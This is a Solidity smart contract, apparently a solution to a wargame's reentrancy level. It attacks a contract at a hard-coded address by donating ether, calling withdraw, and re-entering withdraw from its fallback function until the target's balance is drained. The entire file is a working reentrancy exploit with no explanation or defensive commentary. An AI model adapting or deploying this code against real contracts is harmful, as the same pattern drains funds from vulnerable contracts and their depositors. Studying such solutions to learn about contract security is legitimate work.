// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

/**
 * @title Attack contract for Reentrancy level
 * @author DappScout
 * @notice 
 */
contract Attack10 {

    address payable constant CONTRACT = payable(0xd46fAD070FC4e14cc75064878f7fF09f61cBceB9);

    uint256 amount;


    function attack() payable public{
    
        amount = msg.value;

        (bool success,) = CONTRACT.call{value: msg.value}(abi.encodeWithSignature("donate(address)", address(this)));
        require(success, "Transfer failed");

        (bool success2,) = CONTRACT.call(abi.encodeWithSignature("withdraw(uint256)", amount));
        require(success2, "Transfer failed");
        
    }

    fallback() external payable{
        if (CONTRACT.balance > amount){
            (bool success3,) = CONTRACT.call(abi.encodeWithSignature("withdraw(uint256)", amount));
            require(success3, "Transfer failed");
        }

        else if(CONTRACT.balance <= amount){
            (bool success4,) = CONTRACT.call(abi.encodeWithSignature("withdraw(uint256)", CONTRACT.balance));
            require(success4, "Transfer failed");
        }
    }

}